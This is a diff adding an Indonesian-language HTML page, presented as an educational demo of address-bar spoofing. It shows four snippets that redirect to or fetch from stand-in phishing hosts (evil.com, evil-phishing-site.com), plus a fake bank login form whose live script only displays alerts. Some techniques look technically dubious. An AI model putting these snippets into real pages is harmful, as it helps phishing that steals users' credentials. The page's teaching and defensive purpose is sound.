@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Legitimate Bank Site</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 600px;
+            margin: 50px auto;
+            padding: 20px;
+        }
+        .warning {
+            background: #fff3cd;
+            border: 2px solid #ffc107;
+            padding: 15px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+        }
+        .demo-section {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 5px;
+            margin: 20px 0;
+        }
+        .fake-bank {
+            background: white;
+            border: 1px solid #ddd;
+            padding: 20px;
+            border-radius: 5px;
+        }
+        button {
+            background: #007bff;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 5px;
+        }
+        button:hover {
+            background: #0056b3;
+        }
+        .attack-btn {
+            background: #dc3545;
+        }
+        .attack-btn:hover {
+            background: #c82333;
+        }
+        code {
+            background: #e9ecef;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-size: 0.9em;
+        }
+    </style>
+</head>
+<body>
+    <div class="warning">
+        <strong>⚠️ DEMO EDUKASI</strong><br>
+        Ini adalah demonstrasi untuk tujuan edukasi tentang address bar spoofing. Jangan digunakan untuk tujuan jahat.
+    </div>
+
+    <h1>Address Bar Spoofing - Demo Konsep</h1>
+    
+    <div class="demo-section">
+        <h2>Teknik 1: Navigation Timing Attack</h2>
+        <p>Memanfaatkan timing saat navigasi untuk membuat address bar tidak update:</p>
+        <button onclick="navigationSpoofing()">Demo Navigation Spoofing</button>
+        
+        <h3>Kode yang digunakan:</h3>
+        <pre><code>// Buat iframe tersembunyi
+let iframe = document.createElement('iframe');
+iframe.style.display = 'none';
+iframe.src = 'https://trusted-bank.com';
+
+// Setelah load, ganti konten tanpa update address bar
+iframe.onload = () => {
+    window.location.replace('https://evil-site.com');
+};</code></pre>
+    </div>
+
+    <div class="demo-section">
+        <h2>Teknik 2: Meta Refresh Race Condition</h2>
+        <p>Menggunakan meta refresh dengan timing khusus:</p>
+        <button onclick="metaRefreshAttack()" class="attack-btn">Demo Meta Refresh</button>
+        
+        <h3>Kode yang digunakan:</h3>
+        <pre><code>&lt;meta http-equiv="refresh" 
+      content="0;url=javascript:window.location='evil.com'"&gt;</code></pre>
+    </div>
+
+    <div class="demo-section">
+        <h2>Teknik 3: History Manipulation</h2>
+        <p>Memanipulasi browser history untuk confusion:</p>
+        <button onclick="historyManipulation()">Demo History Manipulation</button>
+        
+        <h3>Kode yang digunakan:</h3>
+        <pre><code>// Push state untuk URL legitimate
+history.pushState({}, '', 'https://trusted-bank.com');
+
+// Tapi load konten dari evil site
+fetch('https://evil-phishing-site.com')
+    .then(r => r.text())
+    .then(html => document.body.innerHTML = html);</code></pre>
+    </div>
+
+    <div class="demo-section">
+        <h2>Teknik 4: Window.open dengan Feature Detection</h2>
+        <button onclick="windowOpenSpoofing()">Demo Window.open Spoofing</button>
+        
+        <h3>Kode yang digunakan:</h3>
+        <pre><code>// Buka window baru
+let win = window.open('https://legitimate-bank.com', '_blank');
+
+// Setelah load, ganti dengan konten jahat
+setTimeout(() => {
+    win.location = 'https://phishing-site.com';
+}, 100);</code></pre>
+    </div>
+
+    <div class="fake-bank" id="fakeContent" style="display:none;">
+        <h2>🏦 Trusted Bank Login</h2>
+        <p><em>Perhatikan address bar - mungkin menampilkan domain yang salah!</em></p>
+        <form>
+            <div style="margin: 10px 0;">
+                <label>Username:</label><br>
+                <input type="text" style="width: 100%; padding: 8px; margin-top: 5px;">
+            </div>
+            <div style="margin: 10px 0;">
+                <label>Password:</label><br>
+                <input type="password" style="width: 100%; padding: 8px; margin-top: 5px;">
+            </div>
+            <button type="button">Login</button>
+        </form>
+        <p style="color: red; margin-top: 20px;">
+            ⚠️ Ini adalah halaman PALSU untuk demonstrasi. Data yang dimasukkan tidak akan dikirim ke mana pun.
+        </p>
+    </div>
+
+    <script>
+        function navigationSpoofing() {
+            alert('Pada browser yang vulnerable, teknik ini akan:\n\n1. Menampilkan trusted-bank.com di address bar\n2. Tapi konten sebenarnya dari evil-site.com\n\nPada demo ini, kita hanya simulasi dengan menampilkan konten palsu.');
+            
+            document.getElementById('fakeContent').style.display = 'block';
+            document.getElementById('fakeContent').scrollIntoView({behavior: 'smooth'});
+        }
+
+        function metaRefreshAttack() {
+            alert('Teknik Meta Refresh memanfaatkan:\n\n1. Race condition saat refresh\n2. Browser tidak sempat update address bar\n3. User melihat URL lama tapi konten baru\n\nIni hanya simulasi untuk edukasi.');
+            
+            document.getElementById('fakeContent').style.display = 'block';
+            document.getElementById('fakeContent').scrollIntoView({behavior: 'smooth'});
+        }
+
+        function historyManipulation() {
+            alert('History Manipulation:\n\n1. Menggunakan history.pushState() untuk set URL\n2. Tapi load konten dari source lain\n3. Address bar menampilkan URL yang di-push\n4. Konten dari attacker\n\nDemo ini hanya simulasi.');
+            
+            // Simulasi pushState (tidak benar-benar mengubah URL untuk keamanan)
+            // history.pushState({}, '', '/trusted-bank-login');
+            
+            document.getElementById('fakeContent').style.display = 'block';
+            document.getElementById('fakeContent').scrollIntoView({behavior: 'smooth'});
+        }
+
+        function windowOpenSpoofing() {
+            alert('Window.open Spoofing:\n\n1. Buka window dengan URL legitimate\n2. Cepat ganti ke URL attacker\n3. Address bar mungkin stuck di URL lama\n\nPada demo ini tidak akan membuka window baru untuk keamanan.');
+        }
+    </script>
+
+    <div style="margin-top: 50px; padding: 20px; background: #d4edda; border-radius: 5px;">
+        <h3>🛡️ Cara Melindungi Diri:</h3>
+        <ul>
+            <li>Selalu update browser/aplikasi ke versi terbaru</li>
+            <li>Periksa sertifikat SSL (ikon gembok)</li>
+            <li>Waspadai URL yang mencurigakan</li>
+            <li>Gunakan password manager yang memeriksa domain</li>
+            <li>Aktifkan 2FA (two-factor authentication)</li>
+        </ul>
+    </div>
+</body>
+</html>
